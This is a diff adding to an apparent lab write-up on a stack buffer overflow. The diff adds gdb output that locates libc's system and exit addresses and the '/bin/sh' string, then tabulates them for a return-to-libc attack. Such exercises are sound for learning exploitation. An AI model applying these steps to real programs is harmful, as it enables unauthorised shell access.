@@ -49,4 +49,25 @@ Stack level 0, frame at 0xffffd710:
 (gdb)
 ```
 
-So we can see that the buffer size is 0xffffd70c - 0xffffd544 = 456 
+So we can see that the buffer size is 0xffffd70c - 0xffffd544 = 456
+
+## Different addresses
+
+```asm
+(gdb) print &system
+$2 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
+(gdb) print &exit
+$3 = (<text variable, no debug info> *) 0xf7e5eb70 <exit>
+(gdb) find &system, +999999999, "/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb)
+```
+
+| Address | Decimal | Name |
+|---------|---------|------|
+| 0xf7e6aed0 | 4159090384 | system |
+| 0xf7e5eb70 | 4159040368 | exit |
+| 0xf7f897ec | 4160264172 | /bin/sh |
+
